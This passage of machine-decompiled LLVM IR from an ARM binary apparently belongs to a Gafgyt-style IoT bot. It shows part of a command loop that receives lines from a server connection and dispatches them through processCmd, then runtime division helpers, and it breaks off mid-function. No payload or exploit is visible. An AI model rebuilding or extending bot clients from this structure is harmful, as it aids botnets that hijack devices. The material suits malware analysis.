  %v1_ef58 = call i32 @sleep(i32 1)
  br label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_eec0, %dec_label_pc_ef24
  %v4_ef74 = call i32 @fdgets(i32 %v2_eec8, i32 1024, i32 %v3_ef14, i32 %v2_eec8)
  %v2_ef7c = icmp eq i32 %v4_ef74, 0
  br i1 %v2_ef7c, label %dec_label_pc_ef84, label %dec_label_pc_ef24

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ef5c
  %v1_ef88 = call i32 @fdpclose(i32 %v3_ef14)
  %v1_ef90 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ef94

dec_label_pc_ef94:                                ; preds = %dec_label_pc_ee94, %dec_label_pc_ef84
  store i32 %v1_ee44, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18cd8.291 to i32), i32* @r1, align 4
  %v2_efa8 = call i32 @__GI_strtok(i32 %v1_ee44, i32 ptrtoint (i32* @global_var_18cd8.291 to i32))
  store i32 %v1_ed70, i32* %stack_var_-624, align 4
  %v2_f0b046 = icmp eq i32 %v2_efa8, 0
  br i1 %v2_f0b046, label %dec_label_pc_f0b8, label %dec_label_pc_efc0

dec_label_pc_efc0:                                ; preds = %dec_label_pc_ef94, %dec_label_pc_f098
  %stack_var_-36.049.in = phi i32 [ %v2_f0a0, %dec_label_pc_f098 ], [ %v2_efa8, %dec_label_pc_ef94 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_f098 ], [ 1, %dec_label_pc_ef94 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_efc4 = load i8, i8* %stack_var_-36.049, align 1
  %v7_efc8 = icmp eq i8 %v2_efc4, 10
  br i1 %v7_efc8, label %dec_label_pc_f098, label %dec_label_pc_efd0

dec_label_pc_efd0:                                ; preds = %dec_label_pc_efc0
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_efdc = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_efe4 = add i32 %v3_efdc, 1
  %v1_efec = call i32 @malloc(i32 %v1_efe4)
  %v0_f000 = load i32, i32* @r4, align 4
  %v3_f000 = mul i32 %v0_f000, 4
  %v2_f00c = add i32 %v2_f008, %v3_f000
  %v2_f010 = inttoptr i32 %v2_f00c to i32*
  store i32 %v1_efec, i32* %v2_f010, align 4
  %v3_f020 = mul i32 %stack_var_-40.147, 4
  %v2_f028 = add i32 %v3_f020, %v19_e550
  %v2_f02c = add i32 %v2_f028, -600
  %v1_f030 = inttoptr i32 %v2_f02c to i32*
  %v2_f030 = load i32, i32* %v1_f030, align 4
  store i32 %v2_f030, i32* @r4, align 4
  %v3_f03c = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f044 = add i32 %v3_f03c, 1
  %v0_f048 = load i32, i32* @r4, align 4
  store i32 %v1_f044, i32* @r2, align 4
  %v2_f058 = inttoptr i32 %v0_f048 to i8*
  %v3_f058 = call i32 @__GI_memset(i8* %v2_f058, i32 0)
  %v2_f078 = load i32, i32* %v1_f030, align 4
  %v4_f088 = call i32 @strcpy(i32 %v2_f078, i8* nonnull %stack_var_-36.049)
  %v1_f090 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_f098

dec_label_pc_f098:                                ; preds = %dec_label_pc_efc0, %dec_label_pc_efd0
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_efc0 ], [ %v1_f090, %dec_label_pc_efd0 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18cd8.291 to i32), i32* @r1, align 4
  %v2_f0a0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_18cd8.291 to i32))
  %v2_f0b0 = icmp eq i32 %v2_f0a0, 0
  br i1 %v2_f0b0, label %dec_label_pc_f0b8, label %dec_label_pc_efc0

dec_label_pc_f0b8:                                ; preds = %dec_label_pc_f098, %dec_label_pc_ef94
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_ef94 ], [ %stack_var_-40.0, %dec_label_pc_f098 ]
  %v3_f0c4 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_f0d0 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_f0d0, label %dec_label_pc_f12c.outer, label %dec_label_pc_f0e8.lr.ph

dec_label_pc_f0e8.lr.ph:                          ; preds = %dec_label_pc_f0b8
  br label %dec_label_pc_f0e8

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_f0e8.lr.ph, %dec_label_pc_f0e8
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_f0e8.lr.ph ], [ %v1_f114, %dec_label_pc_f0e8 ]
  %v3_f0f4 = mul i32 %storemerge15127, 4
  %v2_f0fc = add i32 %v3_f0f4, %v19_e550
  %v2_f100 = add i32 %v2_f0fc, -600
  %v1_f104 = inttoptr i32 %v2_f100 to i32*
  %v2_f104 = load i32, i32* %v1_f104, align 4
  store i32 %v2_f104, i32* @r0, align 4
  %v0_f10c = call i32 @free()
  %v1_f114 = add nuw nsw i32 %storemerge15127, 1
  %v5_f128 = icmp slt i32 %v1_f114, %stack_var_-40.1.lcssa
  br i1 %v5_f128, label %dec_label_pc_f0e8, label %dec_label_pc_f12c.outer

dec_label_pc_f12c.outer:                          ; preds = %dec_label_pc_f0e8, %dec_label_pc_ecd0, %dec_label_pc_eeb0, %dec_label_pc_f0b8, %dec_label_pc_ed2c, %dec_label_pc_e8f8
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_e8f8 ], [ %stack_var_-96.1, %dec_label_pc_ed2c ], [ %stack_var_-96.1, %dec_label_pc_f0b8 ], [ %stack_var_-96.1, %dec_label_pc_eeb0 ], [ %stack_var_-96.1, %dec_label_pc_ecd0 ], [ %stack_var_-96.1, %dec_label_pc_f0e8 ]
  br label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f12c.outer, %dec_label_pc_ec10
  %v2_f130 = load i32, i32* @global_var_22864.48, align 4
  %v5_f14c = call i32 @recvLine(i32 %v2_f130, i8* %v4_f14c, i32 4096, i32 %v2_f13c)
  %v3_f15c = icmp eq i32 %v5_f14c, -1
  br i1 %v3_f15c, label %dec_label_pc_e8dc.outer, label %dec_label_pc_eba4

; uselistorder directives
  uselistorder i32 %v5_f14c, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_f0a0, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_ee7c, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_ee44, { 1, 2, 0 }
  uselistorder i32 %v2_edbc, { 1, 2, 0 }
  uselistorder i8* %v5_ed74, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_ed70, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_eca8, { 1, 2, 0 }
  uselistorder i1 %v9_ebd8, { 1, 0 }
  uselistorder i32 %v3_ebec, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_eb24, { 1, 0 }
  uselistorder i32 %v3_eb58, { 1, 2, 0, 3 }
  uselistorder i32 %v3_eacc, { 1, 0 }
  uselistorder i32 %v1_eab0, { 1, 0 }
  uselistorder i32 %v5_e9f4, { 1, 0 }
  uselistorder i32 %v1_e984, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_eec8, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_f14c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f13c, { 8, 2, 4, 3, 6, 5, 7, 0, 1 }
  uselistorder i32 %v3_e7ec, { 1, 0, 2 }
  uselistorder i32 %v2_e750, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_18cd8.291 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2286c.64, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_28af0.67, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32* @global_var_28ae4.79, { 0, 2, 1 }
  uselistorder i32* @global_var_22864.48, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 4, 3, 0 }
  uselistorder [2 x i8]* @global_var_18c08.264, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_18c08.264 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @srand, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 20, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 18, 19 }
  uselistorder label %dec_label_pc_f12c.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_f0e8, { 1, 0 }
  uselistorder label %dec_label_pc_f098, { 1, 0 }
  uselistorder label %dec_label_pc_efc0, { 1, 0 }
  uselistorder label %dec_label_pc_ef94, { 1, 0 }
  uselistorder label %dec_label_pc_ef5c, { 1, 0 }
  uselistorder label %dec_label_pc_ee58, { 1, 0 }
  uselistorder label %dec_label_pc_ee34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ee24, { 1, 0 }
  uselistorder label %dec_label_pc_eda4, { 1, 0 }
  uselistorder label %dec_label_pc_ed0c, { 1, 0 }
  uselistorder label %dec_label_pc_ecd0, { 1, 0 }
  uselistorder label %dec_label_pc_ec10, { 1, 0 }
  uselistorder label %dec_label_pc_eb98, { 1, 0 }
  uselistorder label %dec_label_pc_eb08, { 1, 0 }
  uselistorder label %dec_label_pc_e9d8, { 1, 0 }
  uselistorder label %dec_label_pc_e8ec, { 1, 0 }
  uselistorder label %dec_label_pc_e8dc.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e8c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e834, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e70c, { 1, 0 }
  uselistorder label %dec_label_pc_e698, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f1b4 = add i32 %arg2, -1
  %v7_f1b4 = icmp eq i32 %arg2, 1
  br i1 %v7_f1b4, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_f1b8 = load i32, i32* @r0, align 4
  ret i32 %v2_f1b8

bb80:                                             ; preds = %entry
  %v2_f1b4 = icmp eq i32 %arg2, 0
  br i1 %v2_f1b4, label %dec_label_pc_f29c, label %dec_label_pc_f1c0

dec_label_pc_f1c0:                                ; preds = %bb80
  %v0_f1c0 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_f1c0, %arg2
  br i1 %tmp, label %dec_label_pc_f1c8, label %dec_label_pc_f254

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f1c0
  %v2_f1c8 = and i32 %v1_f1b4, %arg2
  %v4_f1c8 = icmp eq i32 %v2_f1c8, 0
  br i1 %v4_f1c8, label %dec_label_pc_f260, label %dec_label_pc_f1d0

dec_label_pc_f1d0:                                ; preds = %dec_label_pc_f1c8
  %v3_f1d0 = icmp ult i32 %arg2, 536870912
  br i1 %v3_f1d0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_f1d0
  %v4_f1d4 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_f1d0, %.thread
  %v0_f1f4.pr36.ph = phi i32 [ %v4_f1d4, %.thread ], [ %arg2, %dec_label_pc_f1d0 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_f1d0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_f1f4.pr36 = phi i32 [ %v4_f1e8, %bb83 ], [ %v0_f1f4.pr36.ph, %.preheader.preheader ]
  %v1_f1ec = phi i32 [ %v4_f1ec, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_f1e0 = icmp ugt i32 %v0_f1f4.pr36, 268435455
  br i1 %v2_f1e0, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_f1f4thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_f1e4 = icmp ult i32 %v0_f1f4.pr36, %v0_f1c0
  br i1 %v4_f1e4, label %bb82, label %dec_label_pc_f1f4thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_f1e8 = and i32 %v0_f1f4.pr36, 268435456
  %v3_f1e8 = icmp eq i32 %v2_f1e8, 0
  %v4_f1e8 = mul i32 %v0_f1f4.pr36, 16
  br i1 %v3_f1e8, label %bb83, label %dec_label_pc_f1f4.loopexit

bb83:                                             ; preds = %bb82
  %v2_f1ec = and i32 %v1_f1ec, 268435456
  %v3_f1ec = icmp eq i32 %v2_f1ec, 0
  %v4_f1ec = mul i32 %v1_f1ec, 16
  br i1 %v3_f1ec, label %.preheader, label %dec_label_pc_f1f4thread-pre-split.loopexit.loopexit

dec_label_pc_f1f4thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_f20048.ph = phi i32 [ %v1_f1ec, %bb81 ], [ %v4_f1ec, %bb83 ]
  %v0_f1f4.pr38.ph = phi i32 [ %v0_f1f4.pr36, %bb81 ], [ %v4_f1e8, %bb83 ]
  br label %dec_label_pc_f1f4thread-pre-split.loopexit

dec_label_pc_f1f4thread-pre-split.loopexit:       ; preds = %dec_label_pc_f1f4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_f20048 = phi i32 [ %v1_f1ec, %.thread2 ], [ %v1_f20048.ph, %dec_label_pc_f1f4thread-pre-split.loopexit.loopexit ]
  %v0_f1f4.pr38 = phi i32 [ %v0_f1f4.pr36, %.thread2 ], [ %v0_f1f4.pr38.ph, %dec_label_pc_f1f4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f1f4thread-pre-split

dec_label_pc_f1f4thread-pre-split:                ; preds = %dec_label_pc_f1f4thread-pre-split.loopexit, %bb85
  %v1_f20046 = phi i32 [ %v1_f20048, %dec_label_pc_f1f4thread-pre-split.loopexit ], [ %v3_f200, %bb85 ]
  %v0_f1f4.pr = phi i32 [ %v0_f1f4.pr38, %dec_label_pc_f1f4thread-pre-split.loopexit ], [ %v3_f1fc, %bb85 ]
  br label %dec_label_pc_f1f4

dec_label_pc_f1f4.loopexit:                       ; preds = %bb82
  br label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1f4.loopexit, %dec_label_pc_f1f4thread-pre-split
  %v1_f200 = phi i32 [ %v1_f20046, %dec_label_pc_f1f4thread-pre-split ], [ %v1_f1ec, %dec_label_pc_f1f4.loopexit ]
  %v1_f1fc = phi i32 [ %v0_f1f4.pr, %dec_label_pc_f1f4thread-pre-split ], [ %v4_f1e8, %dec_label_pc_f1f4.loopexit ]
  %v2_f1f4 = icmp slt i32 %v1_f1fc, 0
  br i1 %v2_f1f4, label %dec_label_pc_f208, label %bb84

bb84:                                             ; preds = %dec_label_pc_f1f4
  %v4_f1f8 = icmp ult i32 %v1_f1fc, %v0_f1c0
  br i1 %v4_f1f8, label %bb85, label %dec_label_pc_f208

bb85:                                             ; preds = %bb84
  %v3_f1fc = mul i32 %v1_f1fc, 2
  %v2_f200 = icmp slt i32 %v1_f200, 0
  %v3_f200 = mul i32 %v1_f200, 2
  br i1 %v2_f200, label %dec_label_pc_f208, label %dec_label_pc_f1f4thread-pre-split

dec_label_pc_f208:                                ; preds = %bb84, %dec_label_pc_f1f4, %bb85
  %v2_f21459 = phi i32 [ %v3_f200, %bb85 ], [ %v1_f200, %bb84 ], [ %v1_f200, %dec_label_pc_f1f4 ]
  %v1_f20c51 = phi i32 [ %v3_f1fc, %bb85 ], [ %v1_f1fc, %bb84 ], [ %v1_f1fc, %dec_label_pc_f1f4 ]
  br label %dec_label_pc_f20c

dec_label_pc_f20c:                                ; preds = %.thread11, %dec_label_pc_f208
  %v1_f240 = phi i32 [ %v4_f240, %.thread11 ], [ %v2_f21459, %dec_label_pc_f208 ]
  %v1_f214 = phi i32 [ %v0_f24c, %.thread11 ], [ 0, %dec_label_pc_f208 ]
  %v1_f244 = phi i32 [ %v4_f244, %.thread11 ], [ %v1_f20c51, %dec_label_pc_f208 ]
  %v1_f210 = phi i32 [ %v0_f23c, %.thread11 ], [ %v0_f1c0, %dec_label_pc_f208 ]
  %v3_f20c = icmp ult i32 %v1_f210, %v1_f244
  br i1 %v3_f20c, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_f20c
  %v3_f210 = sub i32 %v1_f210, %v1_f244
  %v3_f214 = or i32 %v1_f214, %v1_f240
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_f20c, %bb86
  %v1_f21c = phi i32 [ %v1_f210, %dec_label_pc_f20c ], [ %v3_f210, %bb86 ]
  %v1_f220 = phi i32 [ %v1_f214, %dec_label_pc_f20c ], [ %v3_f214, %bb86 ]
  %v4_f218 = udiv i32 %v1_f244, 2
  %v6_f218 = icmp ult i32 %v1_f21c, %v4_f218
  br i1 %v6_f218, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_f21c = urem i32 %v1_f244, 2
  %v4_f21c = icmp eq i32 %v3_f21c, 0
  %v6_f21c = sub i32 %v1_f21c, %v4_f218
  br i1 %v4_f21c, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_f220 = udiv i32 %v1_f240, 2
  %v6_f220 = or i32 %v1_f220, %v5_f220
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_f228 = phi i32 [ %v6_f21c, %bb87 ], [ %v1_f21c, %.thread7 ], [ %v6_f21c, %bb88 ]
  %v1_f22c = phi i32 [ %v1_f220, %bb87 ], [ %v1_f220, %.thread7 ], [ %v6_f220, %bb88 ]
  %v4_f224 = udiv i32 %v1_f244, 4
  %v6_f224 = icmp ult i32 %v1_f228, %v4_f224
  br i1 %v6_f224, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_f228 = and i32 %v1_f244, 2
  %v4_f228 = icmp eq i32 %v3_f228, 0
  %v6_f228 = sub i32 %v1_f228, %v4_f224
  br i1 %v4_f228, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_f22c = udiv i32 %v1_f240, 4
  %v6_f22c = or i32 %v1_f22c, %v5_f22c
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_f234 = phi i32 [ %v6_f228, %bb89 ], [ %v1_f228, %.thread8 ], [ %v6_f228, %bb90 ]
  %v1_f238 = phi i32 [ %v1_f22c, %bb89 ], [ %v1_f22c, %.thread8 ], [ %v6_f22c, %bb90 ]
  %v4_f230 = udiv i32 %v1_f244, 8
  %v6_f230 = icmp ult i32 %v1_f234, %v4_f230
  br i1 %v6_f230, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_f234 = and i32 %v1_f244, 4
  %v4_f234 = icmp eq i32 %v3_f234, 0
  %v6_f234 = sub i32 %v1_f234, %v4_f230
  br i1 %v4_f234, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_f238 = udiv i32 %v1_f240, 8
  %v6_f238 = or i32 %v1_f238, %v5_f238
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_f24c = phi i32 [ %v1_f238, %bb91 ], [ %v1_f238, %.thread9 ], [ %v6_f238, %bb92 ]
  %v0_f23c = phi i32 [ %v6_f234, %bb91 ], [ %v1_f234, %.thread9 ], [ %v6_f234, %bb92 ]
  %v2_f23c = icmp eq i32 %v0_f23c, 0
  br i1 %v2_f23c, label %dec_label_pc_f24c, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_f240, 16
  br i1 %tmp140, label %dec_label_pc_f24c, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_f240 = udiv i32 %v1_f240, 16
  %v4_f244 = udiv i32 %v1_f244, 16
  br label %dec_label_pc_f20c

dec_label_pc_f24c:                                ; preds = %thread-pre-split, %bb93
  ret i32 %v0_f24c

dec_label_pc_f254:                                ; preds = %dec_label_pc_f1c0
  %v9_f1c0 = icmp eq i32 %v0_f1c0, %arg2
  %. = zext i1 %v9_f1c0 to i32
  ret i32 %.

dec_label_pc_f260:                                ; preds = %dec_label_pc_f1c8
  %v2_f260 = icmp ugt i32 %arg2, 65535
  br i1 %v2_f260, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_f260
  %v2_f264 = and i32 %arg2, 32768
  %v3_f264 = icmp eq i32 %v2_f264, 0
  %v4_f264 = udiv i32 %arg2, 65536
  br i1 %v3_f264, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_f260
  %v0_f27065 = phi i32 [ %arg2, %dec_label_pc_f260 ], [ %v4_f264, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_f274 = phi i32 [ %v0_f27065, %.thread16 ], [ %v4_f264, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_f270 = icmp ugt i32 %v1_f274, 255
  br i1 %v2_f270, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_f274 = and i32 %v1_f274, 128
  %v3_f274 = icmp eq i32 %v2_f274, 0
  %v4_f274 = udiv i32 %v1_f274, 256
  br i1 %v3_f274, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_f278 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_f284 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_f278, %bb100 ]
  %v1_f280 = phi i32 [ %v1_f274, %bb98 ], [ %v4_f274, %bb99 ], [ %v4_f274, %bb100 ]
  %v2_f27c = icmp ugt i32 %v1_f280, 15
  br i1 %v2_f27c, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_f280 = and i32 %v1_f280, 8
  %v3_f280 = icmp eq i32 %v2_f280, 0
  %v4_f280 = udiv i32 %v1_f280, 16
  br i1 %v3_f280, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_f284 = add nsw i32 %v1_f284, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_f28c = phi i32 [ %v1_f284, %.thread17 ], [ %v1_f284, %bb101 ], [ %v2_f284, %bb102 ]
  %v5_f290 = phi i32 [ %v1_f280, %.thread17 ], [ %v4_f280, %bb101 ], [ %v4_f280, %bb102 ]
  %v2_f288 = icmp ugt i32 %v5_f290, 3
  %v7_f288 = icmp eq i32 %v5_f290, 4
  %v2_f28c = xor i1 %v7_f288, true
  %v3_f28c = and i1 %v2_f288, %v2_f28c
  br i1 %v3_f28c, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_f28c = add nsw i32 %v4_f28c, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_f290 = phi i32 [ %v4_f28c, %.thread18 ], [ %v5_f28c, %bb103 ]
  %v2_f290 = xor i1 %v2_f288, true
  %v3_f290 = or i1 %v7_f288, %v2_f290
  br i1 %v3_f290, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_f290 = udiv i32 %v5_f290, 2
  %v9_f290 = add i32 %v4_f290, %v8_f290
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_f294 = phi i32 [ %v4_f290, %bb104 ], [ %v9_f290, %bb105 ]
  %v6_f294 = lshr i32 %v0_f1c0, %v1_f294
  ret i32 %v6_f294

dec_label_pc_f29c:                                ; preds = %bb80
  %v0_f29c = load i32, i32* @lr, align 4
  %v0_f2a0 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f29c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_f290, { 1, 0 }
  uselistorder i1 %v7_f288, { 1, 0 }
  uselistorder i32 %v4_f280, { 1, 0 }
  uselistorder i32 %v1_f280, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f274, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_f274, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f264, { 1, 0 }
  uselistorder i32 %v0_f23c, { 1, 0 }
  uselistorder i32 %v4_f230, { 1, 0 }
  uselistorder i32 %v1_f238, { 1, 2, 0 }
  uselistorder i32 %v4_f224, { 1, 0 }
  uselistorder i32 %v1_f22c, { 1, 2, 0 }
  uselistorder i32 %v4_f218, { 1, 0 }
  uselistorder i32 %v1_f220, { 1, 2, 0 }
  uselistorder i32 %v1_f244, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_f214, { 1, 0 }
  uselistorder i32 %v1_f240, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f200, { 1, 0 }
  uselistorder i32 %v3_f1fc, { 1, 0 }
  uselistorder i32 %v1_f1fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_f200, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f1ec, { 1, 0 }
  uselistorder i32 %v4_f1e8, { 2, 1, 0 }
  uselistorder i32 %v1_f1ec, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f1f4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_f1c0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_f24c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_f208, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f1f4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f2b0 = udiv i32 %arg1, %arg2
  ret i32 %v2_f2b0
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f2c4 = add i32 %arg2, -1
  %v2_f2c4 = icmp eq i32 %arg2, 0
  br i1 %v2_f2c4, label %dec_label_pc_f380, label %dec_label_pc_f2cc

dec_label_pc_f2cc:                                ; preds = %entry
  %v7_f2c4 = icmp eq i32 %arg2, 1
  br i1 %v7_f2c4, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_f2cc
  %v1_f2cc = load i32, i32* @r0, align 4
  %v10_f2cc = icmp eq i32 %v1_f2cc, %arg2
  br i1 %v10_f2cc, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_f2cc, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_f2cc = icmp ult i32 %v1_f2cc, %arg2
  br i1 %v4_f2cc, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_f2d4 = and i32 %v1_f2c4, %arg2
  %v8_f2d4 = icmp eq i32 %v6_f2d4, 0
  br i1 %v8_f2d4, label %.thread67, label %dec_label_pc_f2e4.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_f2d8 = phi i32 [ %v1_f2cc, %bb75 ], [ 0, %.thread65 ]
  %v3_f2d8 = and i32 %v1_f2d8, %v1_f2c4
  br label %bb76

dec_label_pc_f2e4.preheader:                      ; preds = %bb75
  %v2_f2e499 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_f2e499, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_f374, %bb74, %bb89, %bb84, %dec_label_pc_f344, %.thread67
